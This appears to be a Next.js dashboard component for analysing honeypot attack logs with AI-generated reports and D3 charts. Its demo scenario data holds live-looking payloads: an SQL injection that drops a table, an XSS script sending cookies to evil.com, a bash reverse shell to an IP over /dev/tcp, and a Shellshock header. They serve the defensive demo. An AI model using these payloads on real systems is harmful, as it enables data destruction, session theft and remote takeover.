"use client";

// 대시보드 (static/index.html → Next.js Client Component)
// D3.js 는 npm 패키지로 사용 (CDN → import)

import { useEffect, useRef, useState, useCallback } from "react";
import * as d3 from "d3";
import type { 공격로그입력 } from "@/types/input";
import AttackMap, { type 공격항목 } from "@/components/AttackMap";

// ── 시나리오 데이터 ──────────────────────────────────────────────────────────

const 시나리오목록 = [
  {
    id: "sql", 이름: "SQL 인젝션 공격", 설명: "데이터베이스 해킹 시도 (147회)", 아이콘: "💉", 위험: "높음",
    데이터: { 사건ID: "INC-2025-001", 허니팟ID: "honeypot-42", 발생시각: "2025-03-13T14:32:00+09:00", 공격자IP: "192.168.100.55", 공격자국가: "중국", 공격자포트: 52341, 공격유형: "SQL_INJECTION", 위험점수: 87.5, 탐지신뢰도: 0.94, 위험등급: "HIGH", OWASP분류: "A03-Injection", MITRE전술: "T1190", 페이로드: "' OR '1'='1'; DROP TABLE users; --", 대상URI: "/admin/login", HTTP메서드: "POST", 사용자에이전트: "sqlmap/1.7.8", 행위시퀀스: ["포트스캔", "로그인시도", "SQL인젝션"], 요청횟수: 147, 세션지속시간: 320 } as 공격로그입력,
  },
  {
    id: "brute", 이름: "무차별 대입 공격", 설명: "비밀번호 반복 시도 (2,843회)", 아이콘: "🔨", 위험: "보통",
    데이터: { 사건ID: "INC-2025-002", 허니팟ID: "honeypot-42", 발생시각: "2025-03-13T15:10:00+09:00", 공격자IP: "10.0.0.99", 공격자국가: "러시아", 공격자포트: 49201, 공격유형: "BRUTE_FORCE", 위험점수: 62.0, 탐지신뢰도: 0.89, 위험등급: "MEDIUM", OWASP분류: "A07-AuthFailures", MITRE전술: "T1110", 페이로드: "admin:admin123", 대상URI: "/wp-login.php", HTTP메서드: "POST", 사용자에이전트: "Hydra v9.4", 행위시퀀스: ["포트스캔", "로그인시도", "무차별대입"], 요청횟수: 2843, 세션지속시간: 1800 } as 공격로그입력,
  },
  {
    id: "xss", 이름: "XSS 스크립트 삽입", 설명: "쿠키 탈취 악성 스크립트 주입", 아이콘: "🪲", 위험: "보통",
    데이터: { 사건ID: "INC-2025-003", 허니팟ID: "honeypot-15", 발생시각: "2025-03-13T16:45:00+09:00", 공격자IP: "172.16.0.200", 공격자국가: "미국", 공격자포트: 61234, 공격유형: "XSS", 위험점수: 55.0, 탐지신뢰도: 0.82, 위험등급: "MEDIUM", OWASP분류: "A03-Injection", MITRE전술: "T1059", 페이로드: "<script>fetch('http://evil.com?c='+document.cookie)</script>", 대상URI: "/board/write", HTTP메서드: "POST", 사용자에이전트: "Mozilla/5.0 (Windows NT 10.0)", 행위시퀀스: ["페이지탐색", "XSS시도"], 요청횟수: 8, 세션지속시간: 45 } as 공격로그입력,
  },
  {
    id: "rce", 이름: "원격 코드 실행 시도", 설명: "서버 장악 최고위험 공격", 아이콘: "💀", 위험: "치명",
    데이터: { 사건ID: "INC-2025-004", 허니팟ID: "honeypot-01", 발생시각: "2025-03-13T02:15:00+09:00", 공격자IP: "45.33.32.156", 공격자국가: "북한", 공격자포트: 33456, 공격유형: "RCE", 위험점수: 96.0, 탐지신뢰도: 0.97, 위험등급: "CRITICAL", OWASP분류: "A06-VulnerableComponents", MITRE전술: "T1203", 페이로드: "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1", 대상URI: "/cgi-bin/bash", HTTP메서드: "GET", 사용자에이전트: "() { :;}; /bin/bash -i", 행위시퀀스: ["포트스캔", "취약점스캔", "익스플로잇시도", "RCE시도"], 요청횟수: 412, 세션지속시간: 680 } as 공격로그입력,
  },
];

// ── 결과 카드 HTML 생성 헬퍼 ─────────────────────────────────────────────────

function 사건요약카드(r: Record<string, unknown>): string {
  const pts = ((r.핵심포인트 as string[]) || []).map((p) => `<li>${p}</li>`).join("");
  return `<div class="요약카드"><p class="요약텍스트">${r.요약문 || ""}</p><ul class="포인트목록">${pts}</ul><span class="공격명배지">🏷️ ${r.공격명칭 || ""}</span></div>`;
}
function 의도분석카드(r: Record<string, unknown>): string {
  const pct = Math.round((Number(r.신뢰도) || 0) * 100);
  return `<div class="분석칩카드"><div class="분석칩섹션제목">공격 의도 분류</div><span class="큰배지 ${r.의도}">${r.의도 || "알 수 없음"}</span><div class="신뢰도바컨테이너"><div class="라벨"><span>AI 분석 신뢰도</span><span>${pct}%</span></div><div class="신뢰도바"><div class="채움" style="width:${pct}%"></div></div></div><p class="근거설명">${r.판단근거 || ""}</p></div>`;
}
function 숙련도카드(r: Record<string, unknown>): string {
  const 표시: Record<string, string> = { "Script Kiddie": "초보 해커", "Intermediate": "중급 해커", "Advanced": "고급 해커" };
  const 배지cls: Record<string, string> = { "Script Kiddie": "초보", "Intermediate": "중급", "Advanced": "고급" };
  const 등급 = String(r.등급 || "");
  const 근거 = ((r.근거목록 as string[]) || []).map((g) => `<li>${g}</li>`).join("");
  return `<div class="분석칩카드"><div class="분석칩섹션제목">공격자 숙련도 평가</div><span class="큰배지 ${배지cls[등급] || ""}">${표시[등급] || 등급}</span><ul class="포인트목록" style="margin:8px 0">${근거}</ul><p class="근거설명">${r.종합설명 || ""}</p></div>`;
}
function 대응권고카드(r: Record<string, unknown>): string {
  const 즉각 = ((r.즉각조치 as string[]) || []).map((a) => `<li>${a}</li>`).join("");
  const 장기 = ((r.장기권고 as string[]) || []).map((a) => `<li>${a}</li>`).join("");
  const p = String(r.대응우선순위 || "");
  const 우선cls = p === "즉시" ? "즉시" : p.includes("24") ? "시간" : "주";
  return `<div class="권고카드"><div class="우선순위행">대응 우선순위: <span class="우선순위배지 ${우선cls}">${p}</span></div><p class="권고섹션제목 즉각">🚨 지금 당장 해야 할 조치</p><ul class="권고목록 즉각">${즉각}</ul><p class="권고섹션제목 장기">🔵 장기적으로 해야 할 조치</p><ul class="권고목록 장기">${장기}</ul></div>`;
}
function 전체리포트카드(r: Record<string, unknown>): string {
  let h = "";
  if (r.사건요약) h += `<div style="margin-bottom:6px;font-size:0.8rem;font-weight:700;color:#64748b;">📋 사건 요약</div>${사건요약카드(r.사건요약 as Record<string, unknown>)}`;
  if (r.의도분석 || r.숙련도분석) {
    h += `<hr class="결과구분선"><div class="결과그리드">`;
    if (r.의도분석) h += `<div><div style="margin-bottom:6px;font-size:0.8rem;font-weight:700;color:#64748b;">🎯 공격 의도</div>${의도분석카드(r.의도분석 as Record<string, unknown>)}</div>`;
    if (r.숙련도분석) h += `<div><div style="margin-bottom:6px;font-size:0.8rem;font-weight:700;color:#64748b;">🧠 숙련도</div>${숙련도카드(r.숙련도분석 as Record<string, unknown>)}</div>`;
    h += `</div>`;
  }
  if (r.대응권고) h += `<hr class="결과구분선"><div style="margin-bottom:6px;font-size:0.8rem;font-weight:700;color:#64748b;">🛡️ 대응 권고</div>${대응권고카드(r.대응권고 as Record<string, unknown>)}`;
  if (r.리포트서술) h += `<hr class="결과구분선"><div style="margin-bottom:8px;font-size:0.8rem;font-weight:700;color:#64748b;">📝 종합 리포트</div><div class="리포트서술박스">${r.리포트서술}</div>`;
  return h;
}

// ── 메인 컴포넌트 ────────────────────────────────────────────────────────────

export default function DashboardPage() {
  const [선택시나리오, set선택시나리오] = useState<typeof 시나리오목록[0] | null>(null);
  const [분석중, set분석중] = useState(false);
  const [서버상태, set서버상태] = useState<{ 연결됨: boolean; 모델: string }>({ 연결됨: false, 모델: "" });
  const [스트리밍텍스트, set스트리밍텍스트] = useState("");
  const [결과HTML, set결과HTML] = useState("");
  const [차트HTML, set차트HTML] = useState("");
  const [단계칩, set단계칩] = useState<{ 이름: string; 상태: "pending" | "진행중" | "완료" }[]>([]);
  const [showStreaming, setShowStreaming] = useState(false);
  const [showSteps, setShowSteps] = useState(false);
  const [showPDF, setShowPDF] = useState(false);
  const [showGauge, setShowGauge] = useState(false);
  const [showGraph, setShowGraph] = useState(false);
  const [커서보임, set커서보임] = useState(false);
  const [showEmpty, setShowEmpty] = useState(true);

  const 게이지SVGRef = useRef<SVGSVGElement>(null);
  const 네트워크SVGRef = useRef<SVGSVGElement>(null);
  const 스트리밍본문Ref = useRef<HTMLDivElement>(null);
  const 시뮬레이션Ref = useRef<d3.Simulation<d3.SimulationNodeDatum, undefined> | null>(null);
  const 레이더SVGRef = useRef<SVGSVGElement | null>(null);
  const 바차트SVGRef = useRef<SVGSVGElement | null>(null);

  // ── 서버 상태 확인 ──────────────────────────────────────────────────────
  useEffect(() => {
    fetch("/api/health")
      .then((r) => r.json())
      .then((data: { Ollama연결: boolean; 사용모델: string }) => {
        set서버상태({ 연결됨: data.Ollama연결, 모델: data.사용모델 });
      })
      .catch(() => {});
  }, []);

  // ── D3 게이지 ────────────────────────────────────────────────────────────
  const 게이지그리기 = useCallback((위험점수: number) => {
    if (!게이지SVGRef.current) return;
    const 건강점수 = Math.round(100 - 위험점수);
    const svg = d3.select(게이지SVGRef.current);
    svg.selectAll("*").remove();
    const W = 220, H = 115, cx = W / 2, cy = 102, R외 = 88, R내 = 58;
    const g = svg.append("g").attr("transform", `translate(${cx},${cy})`);
    const 각도 = (p: number) => -Math.PI / 2 + (p / 100) * Math.PI;
    const arc = d3.arc<{ startAngle: number; endAngle: number }>().innerRadius(R내).outerRadius(R외).cornerRadius(4);

    g.append("path").attr("d", arc({ startAngle: 각도(0), endAngle: 각도(100) }) ?? "").attr("fill", "#e2e8f0");
    ([{ s: 0, e: 34, c: "#ef4444" }, { s: 34, e: 67, c: "#f59e0b" }, { s: 67, e: 100, c: "#22c55e" }] as const).forEach(({ s, e, c }) => {
      g.append("path").attr("d", arc({ startAngle: 각도(s), endAngle: 각도(e) }) ?? "").attr("fill", c).attr("opacity", 0.18);
    });

    const 활성색 = 건강점수 < 34 ? "#ef4444" : 건강점수 < 67 ? "#f59e0b" : "#22c55e";
    const 활성arc = g.append("path").attr("fill", 활성색).attr("filter", `drop-shadow(0 0 6px ${활성색}88)`);
    const d = { startAngle: 각도(0), endAngle: 각도(0) };
    활성arc.datum(d).attr("d", arc(d) ?? "")
      .transition().duration(900).ease(d3.easeCubicOut)
      .attrTween("d", () => {
        const i = d3.interpolate(d.endAngle, 각도(건강점수));
        return (t) => { d.endAngle = i(t); return arc(d) ?? ""; };
      });

    [0, 25, 50, 75, 100].forEach((p) => {
      const θ = 각도(p);
      g.append("line").attr("x1", (R외 + 5) * Math.sin(θ)).attr("y1", -(R외 + 5) * Math.cos(θ))
        .attr("x2", (R외 + 11) * Math.sin(θ)).attr("y2", -(R외 + 11) * Math.cos(θ))
        .attr("stroke", "#cbd5e1").attr("stroke-width", 1.5).attr("stroke-linecap", "round");
      g.append("text").attr("x", (R외 + 20) * Math.sin(θ)).attr("y", -(R외 + 20) * Math.cos(θ))
        .attr("text-anchor", "middle").attr("dominant-baseline", "middle")
        .attr("font-size", "9px").attr("fill", "#94a3b8").text(p);
    });

    const 바늘 = g.append("line").attr("x1", 0).attr("y1", 0).attr("x2", 0).attr("y2", 0)
      .attr("stroke", "#1a1a2e").attr("stroke-width", 2.5).attr("stroke-linecap", "round");
    const L = R내 - 6;
    바늘.transition().duration(900).ease(d3.easeCubicOut)
      .attrTween("x2", () => { const i = d3.interpolate(0, L * Math.sin(각도(건강점수))); return (t) => String(i(t)); })
      .attrTween("y2", () => { const i = d3.interpolate(0, -L * Math.cos(각도(건강점수))); return (t) => String(i(t)); });

    g.append("circle").attr("r", 6).attr("fill", "#1a1a2e");
    g.append("text").attr("text-anchor", "middle").attr("y", -16)
      .attr("font-size", "28px").attr("font-weight", "800").attr("fill", 활성색).text(건강점수);
    g.append("text").attr("text-anchor", "middle").attr("y", 0)
      .attr("font-size", "10px").attr("fill", "#94a3b8").text("/ 100");
  }, []);

  // ── D3 네트워크 그래프 ───────────────────────────────────────────────────
  const 네트워크그래프그리기 = useCallback((로그: 공격로그입력) => {
    if (!네트워크SVGRef.current) return;
    const svgEl = 네트워크SVGRef.current;
    const W = svgEl.getBoundingClientRect().width || 560, H = 260;
    const svg = d3.select(svgEl).attr("viewBox", `0 0 ${W} ${H}`).attr("width", W).attr("height", H);
    svg.selectAll("*").remove();
    if (시뮬레이션Ref.current) 시뮬레이션Ref.current.stop();

    type 노드타입 = d3.SimulationNodeDatum & { id: string; label: string; sub?: string; type: string };
    const 노드: 노드타입[] = [
      { id: "attacker", label: 로그.공격자IP, sub: 로그.공격자국가 ?? "", type: "attacker" },
      ...로그.행위시퀀스.map((행위, i) => ({ id: `act_${i}`, label: 행위, type: "action" })),
      { id: "honeypot", label: "🍯 허니팟", sub: 로그.허니팟ID, type: "honeypot" },
    ];
    type 링크타입 = d3.SimulationLinkDatum<노드타입> & { source: string | 노드타입; target: string | 노드타입 };
    const 링크: 링크타입[] = [];
    let 이전 = "attacker";
    로그.행위시퀀스.forEach((_, i) => { 링크.push({ source: 이전, target: `act_${i}` }); 이전 = `act_${i}`; });
    링크.push({ source: 이전, target: "honeypot" });

    const defs = svg.append("defs");
    defs.append("marker").attr("id", "화살표").attr("viewBox", "0 -5 10 10").attr("refX", 28).attr("refY", 0).attr("markerWidth", 6).attr("markerHeight", 6).attr("orient", "auto")
      .append("path").attr("d", "M0,-5L10,0L0,5").attr("fill", "#94a3b8");
    const 필터 = defs.append("filter").attr("id", "glow").attr("x", "-30%").attr("y", "-30%").attr("width", "160%").attr("height", "160%");
    필터.append("feGaussianBlur").attr("stdDeviation", "4").attr("result", "blur");
    필터.append("feMerge").selectAll("feMergeNode").data(["blur", "SourceGraphic"]).join("feMergeNode").attr("in", (d) => d);

    const 링크El = svg.append("g").selectAll("line").data(링크).join("line")
      .attr("stroke", "#e2e8f0").attr("stroke-width", 2).attr("stroke-dasharray", "7 4").attr("marker-end", "url(#화살표)");
    const 노드El = svg.append("g").selectAll<SVGGElement, 노드타입>("g").data(노드).join("g").attr("cursor", "default");

    노드El.append("circle")
      .attr("r", (d) => d.type === "action" ? 20 : 28)
      .attr("fill", (d) => d.type === "attacker" ? "#fee2e2" : d.type === "honeypot" ? "#eef2ff" : "#f8fafc")
      .attr("stroke", (d) => d.type === "attacker" ? "#ef4444" : d.type === "honeypot" ? "#6366f1" : "#cbd5e1")
      .attr("stroke-width", 2).attr("filter", (d) => d.type === "attacker" ? "url(#glow)" : null);
    노드El.filter((d) => d.type !== "action").append("text")
      .attr("text-anchor", "middle").attr("dominant-baseline", "central").attr("font-size", "16px")
      .text((d) => d.type === "attacker" ? "⚠️" : "🍯");
    노드El.filter((d) => d.type === "action").append("text")
      .attr("text-anchor", "middle").attr("dominant-baseline", "central")
      .attr("font-size", "9.5px").attr("font-weight", "600").attr("fill", "#475569")
      .text((d) => d.label.slice(0, 5));
    노드El.append("text").attr("text-anchor", "middle").attr("y", (d) => d.type === "action" ? 30 : 38)
      .attr("font-size", "10px").attr("font-weight", "600").attr("fill", "#374151")
      .text((d) => d.label.length > 13 ? d.label.slice(0, 13) + "…" : d.label);
    노드El.filter((d) => !!d.sub).append("text").attr("text-anchor", "middle").attr("y", (d) => d.type === "action" ? 43 : 50)
      .attr("font-size", "9px").attr("fill", "#94a3b8").text((d) => d.sub ?? "");

    function 입자생성(링크d: 링크타입) {
      const 입자 = svg.append("circle").attr("r", 4).attr("fill", "#ef4444").attr("opacity", 0.85).attr("filter", "url(#glow)");
      function 이동() {
        const src = 링크d.source as 노드타입;
        const tgt = 링크d.target as 노드타입;
        if (!src.x) return;
        입자.attr("cx", src.x!).attr("cy", src.y!)
          .transition().duration(1200).ease(d3.easeLinear)
          .attr("cx", tgt.x!).attr("cy", tgt.y!)
          .on("end", () => setTimeout(이동, Math.random() * 800));
      }
      setTimeout(이동, Math.random() * 1000);
    }

    const sim = d3.forceSimulation<노드타입>(노드)
      .force("link", d3.forceLink<노드타입, 링크타입>(링크).id((d) => d.id).distance(95))
      .force("charge", d3.forceManyBody().strength(-260))
      .force("center", d3.forceCenter(W / 2, H / 2))
      .force("x", d3.forceX(W / 2).strength(0.04))
      .force("y", d3.forceY(H / 2).strength(0.06))
      .on("tick", () => {
        링크El.attr("x1", (d) => (d.source as 노드타입).x!).attr("y1", (d) => (d.source as 노드타입).y!)
          .attr("x2", (d) => (d.target as 노드타입).x!).attr("y2", (d) => (d.target as 노드타입).y!);
        노드El.attr("transform", (d) => `translate(${Math.max(32, Math.min(W - 32, d.x!))},${Math.max(32, Math.min(H - 32, d.y!))})`);
      })
      .on("end", () => { 링크.forEach((l) => 입자생성(l)); });

    시뮬레이션Ref.current = sim as unknown as d3.Simulation<d3.SimulationNodeDatum, undefined>;
  }, []);

  // ── 시나리오 선택 ────────────────────────────────────────────────────────
  function 시나리오선택(id: string) {
    const s = 시나리오목록.find((x) => x.id === id)!;
    set선택시나리오(s);
    setShowEmpty(false);
    setShowGauge(true);
    setShowGraph(true);
    setTimeout(() => {
      게이지그리기(s.데이터.위험점수);
      네트워크그래프그리기(s.데이터);
    }, 50);
  }

  // ── 분석 시작 ────────────────────────────────────────────────────────────
  async function 분석시작() {
    if (!선택시나리오 || 분석중) return;
    set분석중(true);
    set결과HTML("");
    set차트HTML("");
    set스트리밍텍스트("");
    setShowPDF(false);
    setShowStreaming(true);
    setShowSteps(true);
    set커서보임(true);
    set단계칩([
      { 이름: "사건 요약", 상태: "pending" },
      { 이름: "공격 의도", 상태: "pending" },
      { 이름: "숙련도 분석", 상태: "pending" },
      { 이름: "대응 권고", 상태: "pending" },
      { 이름: "리포트 서술", 상태: "pending" },
    ]);

    try {
      const res = await fetch("/api/analyze/stream", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 분석유형: "전체리포트", 로그: 선택시나리오.데이터 }),
      });
      const reader = res.body!.getReader();
      const decoder = new TextDecoder();
      let buf = "";

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += decoder.decode(value, { stream: true });
        const lines = buf.split("\n");
        buf = lines.pop() ?? "";
        for (const line of lines) {
          if (line.startsWith("data: ")) {
            try { 이벤트처리(JSON.parse(line.slice(6)) as Record<string, unknown>); } catch { /* skip */ }
          }
        }
      }
    } catch (e) {
      set결과HTML(`<div class="오류박스">❌ 연결 오류: ${String(e)}<br>서버가 실행 중인지 확인해주세요.</div>`);
    }

    set분석중(false);
    set커서보임(false);
  }

  function 이벤트처리(ev: Record<string, unknown>) {
    switch (ev.유형) {
      case "시작":
        set스트리밍텍스트((p) => p + `▶ ${ev.메시지}\n\n`);
        break;
      case "단계시작":
        set단계칩((prev) => prev.map((c, i) => i === (Number(ev.단계) - 1) ? { ...c, 상태: "진행중" } : c));
        set스트리밍텍스트((p) => p + `\n\n── [${ev.단계}/${ev.총단계}] ${ev.이름} ──\n`);
        break;
      case "단계완료":
        set단계칩((prev) => prev.map((c, i) => i === (Number(ev.단계) - 1) ? { ...c, 상태: "완료" } : c));
        break;
      case "토큰":
        set스트리밍텍스트((p) => p + String(ev.텍스트));
        setTimeout(() => {
          if (스트리밍본문Ref.current) 스트리밍본문Ref.current.scrollTop = 스트리밍본문Ref.current.scrollHeight;
        }, 10);
        break;
      case "완료": {
        set스트리밍텍스트((p) => p + "\n\n✅ 분석 완료");
        const 결과 = ev.결과 as Record<string, unknown>;
        const 유형이름: Record<string, string> = { 사건요약: "📋 사건 요약", 의도분석: "🎯 공격 의도 분석", 숙련도분석: "🧠 숙련도 분석", 대응권고: "🛡️ 대응 권고", 전체리포트: "📄 전체 분석 리포트" };
        const 유형 = String(ev.분석유형);
        let html = `<div class="카드"><div class="결과카드헤더"><span class="결과카드제목">${유형이름[유형] || "분석 결과"}</span><span class="결과카드부제">AI 분석 완료</span></div>`;
        if (유형 === "사건요약") html += 사건요약카드(결과);
        else if (유형 === "의도분석") html += 의도분석카드(결과);
        else if (유형 === "숙련도분석") html += 숙련도카드(결과);
        else if (유형 === "대응권고") html += 대응권고카드(결과);
        else if (유형 === "전체리포트") html += 전체리포트카드(결과);
        html += `</div>`;
        set결과HTML(html);

        if (유형 === "전체리포트" && 선택시나리오) {
          setShowPDF(true);
          // 차트 렌더링은 다음 tick 이후 D3 ref가 DOM에 있을 때 수행
          set차트HTML("__RENDER_CHARTS__");
          setTimeout(() => {
            if (레이더SVGRef.current && 바차트SVGRef.current) {
              const 숙련도점수: Record<string, number> = { "Script Kiddie": 25, "Intermediate": 60, "Advanced": 92 };
              const 의도점수: Record<string, number> = { 정보수집: 22, 취약점탐색: 48, 침투시도: 72, 데이터탈취: 88, 서비스방해: 65 };
              const 의도 = 결과.의도분석 as Record<string, unknown> | undefined;
              const 숙련도 = 결과.숙련도분석 as Record<string, unknown> | undefined;
              const 권고 = 결과.대응권고 as Record<string, unknown> | undefined;
              const 숙련도점수값 = 숙련도점수[String(숙련도?.등급 ?? "")] ?? 50;
              const 의도점수값 = 의도점수[String(의도?.의도 ?? "")] ?? 50;
              const p = String(권고?.대응우선순위 ?? "");
              const 긴급도 = p.includes("즉시") ? 95 : p.includes("24") ? 65 : 40;
              레이더차트그리기([
                { 축: "위험도", 값: 선택시나리오.데이터.위험점수 },
                { 축: "정교함", 값: 숙련도점수값 },
                { 축: "파급력", 값: 의도점수값 },
                { 축: "탐지신뢰도", 값: (선택시나리오.데이터.탐지신뢰도 || 0.8) * 100 },
                { 축: "긴급도", 값: 긴급도 },
              ]);
              바차트그리기([
                { 항목: "위험 점수", 값: 선택시나리오.데이터.위험점수, 색: "#ef4444" },
                { 항목: "탐지 신뢰도", 값: (선택시나리오.데이터.탐지신뢰도 || 0.8) * 100, 색: "#6366f1" },
                { 항목: "공격자 정교함", 값: 숙련도점수값, 색: "#f59e0b" },
                { 항목: "파급력 점수", 값: 의도점수값, 색: "#8b5cf6" },
                { 항목: "대응 긴급도", 값: 긴급도, 색: "#dc2626" },
              ]);
            }
          }, 100);
        }
        break;
      }
      case "오류":
        set결과HTML(`<div class="오류박스">❌ ${ev.메시지}</div>`);
        break;
    }
  }

  // ── D3 레이더 차트 ───────────────────────────────────────────────────────
  function 레이더차트그리기(데이터목록: { 축: string; 값: number }[]) {
    if (!레이더SVGRef.current) return;
    const svg = d3.select(레이더SVGRef.current);
    svg.selectAll("*").remove();
    const W = 280, H = 260, cx = W / 2, cy = H / 2 + 10, R = 90;
    const N = 데이터목록.length;
    const 각도fn = (i: number) => (Math.PI * 2 * i / N) - Math.PI / 2;
    const 값to좌표 = (i: number, 값: number): [number, number] => {
      const r = (값 / 100) * R;
      return [cx + r * Math.cos(각도fn(i)), cy + r * Math.sin(각도fn(i))];
    };
    const g = svg.append("g");

    [20, 40, 60, 80, 100].forEach((p) => {
      const pts = d3.range(N).map((i) => 값to좌표(i, p));
      g.append("polygon").attr("points", pts.map((d) => d.join(",")).join(" "))
        .attr("fill", p === 100 ? "#f8fafc" : "none").attr("stroke", "#e2e8f0").attr("stroke-width", p === 100 ? 1.5 : 1);
    });
    d3.range(N).forEach((i) => {
      const [x, y] = 값to좌표(i, 100);
      g.append("line").attr("x1", cx).attr("y1", cy).attr("x2", x).attr("y2", y).attr("stroke", "#e2e8f0").attr("stroke-width", 1);
    });
    const pts = 데이터목록.map((d, i) => 값to좌표(i, d.값));
    g.append("polygon").attr("points", pts.map((d) => d.join(",")).join(" ")).attr("fill", "#6366f130").attr("stroke", "#6366f1").attr("stroke-width", 2);
    pts.forEach(([x, y]) => {
      g.append("circle").attr("cx", x).attr("cy", y).attr("r", 4).attr("fill", "#6366f1").attr("stroke", "white").attr("stroke-width", 1.5);
    });
    데이터목록.forEach((d, i) => {
      const [x, y] = 값to좌표(i, 118);
      const 정렬 = x < cx - 5 ? "end" : x > cx + 5 ? "start" : "middle";
      g.append("text").attr("x", x).attr("y", y).attr("text-anchor", 정렬).attr("dominant-baseline", "middle").attr("font-size", "11px").attr("font-weight", "700").attr("fill", "#374151").text(d.축);
      g.append("text").attr("x", x).attr("y", y + 13).attr("text-anchor", 정렬).attr("dominant-baseline", "middle").attr("font-size", "10px").attr("fill", "#6366f1").attr("font-weight", "800").text(Math.round(d.값));
    });
  }

  // ── D3 바 차트 ───────────────────────────────────────────────────────────
  function 바차트그리기(데이터목록: { 항목: string; 값: number; 색: string }[]) {
    if (!바차트SVGRef.current) return;
    const svg = d3.select(바차트SVGRef.current);
    svg.selectAll("*").remove();
    const W = 280, 여백L = 80, 여백R = 45, 여백T = 15;
    const 바높이 = 24, 바간격 = 20;
    const 바영역W = W - 여백L - 여백R;
    const g = svg.append("g").attr("transform", `translate(${여백L},${여백T})`);

    데이터목록.forEach((d, i) => {
      const y = i * (바높이 + 바간격);
      const barW = (d.값 / 100) * 바영역W;
      g.append("rect").attr("x", 0).attr("y", y).attr("width", 바영역W).attr("height", 바높이).attr("rx", 6).attr("fill", "#f1f5f9");
      g.append("rect").attr("x", 0).attr("y", y).attr("width", 0).attr("height", 바높이).attr("rx", 6).attr("fill", d.색).attr("opacity", 0.85)
        .transition().duration(800).delay(i * 100).ease(d3.easeCubicOut).attr("width", barW);
      g.append("text").attr("x", -8).attr("y", y + 바높이 / 2).attr("text-anchor", "end").attr("dominant-baseline", "middle").attr("font-size", "11px").attr("font-weight", "600").attr("fill", "#374151").text(d.항목);
      g.append("text").attr("x", 바영역W + 6).attr("y", y + 바높이 / 2).attr("dominant-baseline", "middle").attr("font-size", "11px").attr("font-weight", "800").attr("fill", d.색).text(Math.round(d.값));
    });
  }

  // ── PDF 저장 ─────────────────────────────────────────────────────────────
  async function PDF저장() {
    if (!선택시나리오) return;
    const { default: html2canvas } = await import("html2canvas");
    const { jsPDF } = await import("jspdf");

    const 시각 = new Date().toLocaleString("ko-KR");
    const 결과내용 = 결과HTML;
    const 임시div = document.createElement("div");
    임시div.style.cssText = "position:absolute;top:0;left:0;width:794px;background:#ffffff;padding:40px 44px;z-index:9999;font-family:-apple-system,BlinkMacSystemFont,'Apple SD Gothic Neo','Noto Sans KR',sans-serif;color:#1a1a2e;box-sizing:border-box;";
    임시div.innerHTML = `
      <div style="padding-bottom:16px;border-bottom:3px solid #0f172a;margin-bottom:24px;">
        <div style="font-size:1.3rem;font-weight:800;color:#0f172a;">🍯 정사평 — 허니팟 공격 분석 리포트</div>
        <div style="font-size:0.8rem;color:#64748b;margin-top:5px;">시나리오: ${선택시나리오.이름} · 생성: ${시각}</div>
      </div>
      <div>${결과내용}</div>
    `;
    document.body.appendChild(임시div);
    const 이전스크롤Y = window.scrollY;
    window.scrollTo(0, 0);
    try {
      const canvas = await html2canvas(임시div, { scale: 2, useCORS: true, logging: false, backgroundColor: "#ffffff", scrollX: 0, scrollY: 0, windowWidth: 794 });
      const pdf = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
      const margin = 12, contentW = 210 - margin * 2, contentH = 297 - margin * 2;
      const totalImgH = (canvas.height / canvas.width) * contentW;
      const totalPages = Math.ceil(totalImgH / contentH);
      for (let i = 0; i < totalPages; i++) {
        if (i > 0) pdf.addPage();
        const srcY = Math.round((i * contentH / totalImgH) * canvas.height);
        const srcH = Math.round(Math.min((contentH / totalImgH) * canvas.height, canvas.height - srcY));
        const destH = (srcH / canvas.height) * totalImgH;
        const slice = document.createElement("canvas");
        slice.width = canvas.width; slice.height = Math.max(srcH, 1);
        const ctx = slice.getContext("2d")!;
        ctx.fillStyle = "#ffffff"; ctx.fillRect(0, 0, slice.width, slice.height);
        ctx.drawImage(canvas, 0, srcY, canvas.width, srcH, 0, 0, canvas.width, srcH);
        pdf.addImage(slice.toDataURL("image/jpeg", 0.95), "JPEG", margin, margin, contentW, destH);
      }
      pdf.save(`정사평_공격분석_${선택시나리오.이름}_${new Date().toISOString().slice(0, 10)}.pdf`);
    } finally {
      document.body.removeChild(임시div);
      window.scrollTo(0, 이전스크롤Y);
    }
  }

  const 단계이름 = ["사건 요약", "공격 의도", "숙련도 분석", "대응 권고", "리포트 서술"];
  const 건강점수 = 선택시나리오 ? Math.round(100 - 선택시나리오.데이터.위험점수) : null;
  const 활성색 = 건강점수 !== null ? (건강점수 < 34 ? "#ef4444" : 건강점수 < 67 ? "#f59e0b" : "#22c55e") : "#22c55e";
  const 건강라벨 = 건강점수 !== null ? (건강점수 < 34 ? "위험" : 건강점수 < 67 ? "주의" : "양호") : "";

  // 어택맵용 데이터 — 선택된 시나리오만
  const 어택맵데이터: 공격항목 | null = 선택시나리오
    ? {
        국가: 선택시나리오.데이터.공격자국가 ?? "미국",
        ip: 선택시나리오.데이터.공격자IP,
        공격유형: 선택시나리오.데이터.공격유형,
        위험등급: 선택시나리오.데이터.위험등급,
      }
    : null;

  return (
    <>
      <style>{`
        body { background: #f0f4f8; color: #1a1a2e; min-height: 100vh; }
        header { background: #0f172a; color: white; padding: 0 32px; display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 16px rgba(0,0,0,0.4); }
        .헤더왼쪽 { display: flex; align-items: center; gap: 12px; }
        .헤더로고 { font-size: 1.5rem; }
        .헤더제목 { font-size: 1.05rem; font-weight: 700; }
        .헤더제목 span { color: #fbbf24; }
        .헤더부제 { font-size: 0.72rem; color: #64748b; margin-top: 1px; }
        .서버상태칩 { display: flex; align-items: center; gap: 7px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 5px 12px; font-size: 0.78rem; color: #94a3b8; }
        .레이아웃 { display: grid; grid-template-columns: 380px 1fr; gap: 20px; padding: 24px 28px; max-width: 1440px; margin: 0 auto; }
        .카드 { background: white; border-radius: 14px; padding: 18px 20px; box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 4px 16px rgba(0,0,0,0.04); }
        .섹션헤더 { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
        .섹션번호 { width: 22px; height: 22px; border-radius: 50%; background: #6366f1; color: white; font-size: 0.72rem; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .섹션제목 { font-size: 0.88rem; font-weight: 700; color: #1e293b; }
